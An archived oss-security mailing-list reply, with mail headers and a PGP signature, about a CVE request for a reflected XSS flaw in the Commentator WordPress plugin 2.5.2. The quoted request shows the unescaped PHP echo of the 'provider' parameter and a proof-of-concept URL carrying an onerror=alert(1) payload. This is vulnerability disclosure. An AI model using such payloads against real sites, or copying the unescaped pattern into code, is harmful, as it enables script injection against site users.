X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1964" "Saturday" "16" "January" "2016" "13:45:44" "+0200" "Henri Salo" "henri@nerv.fi" "<20160116114544.GA19210@tunkki>" "49" "Re: [oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability" "^Cc:" nil nil "1" "2016011611:45:44" "[oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability" (number mark "        henri@nerv.f Jan 16   49/1964  " thread-indent "\"Re: [oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability\"\n") "<CADLX=aE8i3sGRMXGAAXwrgxY47b-QcPMBQoGRPKOAsmWcTJoZA@mail.gmail.com>" ("<CADLX=aE8i3sGRMXGAAXwrgxY47b-QcPMBQoGRPKOAsmWcTJoZA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 26531 invoked by uid 550); 16 Jan 2016 11:46:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 26510 invoked from network); 16 Jan 2016 11:46:39 -0000
X-Virus-Scanned: Debian amavisd-new at mango.nerv.fi
Message-ID: <20160116114544.GA19210@tunkki>
References: <CADLX=aE8i3sGRMXGAAXwrgxY47b-QcPMBQoGRPKOAsmWcTJoZA@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii; x-action=pgp-signed
In-Reply-To: <CADLX=aE8i3sGRMXGAAXwrgxY47b-QcPMBQoGRPKOAsmWcTJoZA@mail.gmail.com>
User-Agent: Mutt/1.5.23 (2014-03-12)
Cc: oss-security@lists.openwall.com
Date: Sat, 16 Jan 2016 13:45:44 +0200
From: Henri Salo <henri@nerv.fi>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] CVE Request: Commentator WordPress Plugin 2.5.2
 XSS Vulnerability
To: Rahul Pratap Singh <techno.rps@gmail.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

On Wed, Jan 13, 2016 at 07:42:12PM +0530, Rahul Pratap Singh wrote:
> I would request you to assign CVE id to this issue.
> 
> file: commentator.php
> 
> line:441
> $provider_name = $_REQUEST["provider"];
> line:544
> <div id="commentator-social-signin" class="commentator-<?php echo
> $provider_name; ?>">
>
> /wp-admin/admin-ajax.php?action=commentator_social_signin&provider=facebook">%20<IMG%20SRC=axc%20onerror=alert(1)>
> 
> https://0x62626262.files.wordpress.com/2016/01/commentatorxsspoc.png
> http://codecanyon.net/item/commentator-wordpress-plugin/6425752
> https://0x62626262.wordpress.com/2016/01/13/commentator-wordpress-plugin-xss-vulnerability
> 
> Fix: Update to 2.5.3

Are you sure that this plugin is open source software? There is a plugin named
"commentator" in the WordPress Plugin Directory[1,2], but it seems to be
different codebase (might be older version) and last update is 2012-10-28. Item
in codecanyon.net requires paid license.

1: http://plugins.svn.wordpress.org/commentator/trunk/
2: http://plugins.svn.wordpress.org/commentator/trunk/readme.txt

- -- 
Henri Salo
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJWmi1oAAoJECet96ROqnV0W9MQAM7/GMMtvzWRATSgzTXJhcw3
HnNwxM37fwyUOxxkAiwI0Qhb5btrZ4mnIK1oOpHZ1d55le/6GBdvxG28lmN9KZBs
8iiv26hX1D/+tDyXWLtRaZUwC46Mx7geoNoH55dk+MWip1LdhIDjc7eqvB26GT04
nq8y5gPHUv6VEtS/rgLzW6VVrATVxCTOvHMEzvxgbkHmntDRIaVsDk+krQ8HnlUM
U7x0REkQmvhM+lAascIaS0vYLz+Had1+Us4F+cA88FPpA2UGzXvRXOcoyYLGu5H+
99RgnTP1x1Lk6/1E5NYfSnyNwsS8wFsxw8SlUEbRJaEqFJSYjhHq0ho+yVTC9ekx
z2y0AfOZ/5xjsUZkJgJOwV9ovXVwhe1S55ChmgJRsQ20wc0w8qSgQVd+7+PEiMvb
ZJxie5x0vsc9X8jQPPBrYCA9RfDIQnNeYcebdECZm/zg0IvGBTKqu2ZSht8ndymC
W8yZop/BkXO9Ge1SLW2jpRkTJG6moH/k7b0X4Lim1GtaAi21hdUvgOZ8LLQnWk0G
AphLO8mSauqyEU5sY2g3zHMVbIGzjuQ8Iw2So1WNLdoxss5lm75YEhCij0bpVXSb
7bCLrlvxPtbphuEA2Mb8R9jPQ7xI66EqjOu+yZfyUnfY27Co7sCUGUnkLGoxfhHU
t0yWufUCj9ZCW7lfA01K
=dsWg
-----END PGP SIGNATURE-----
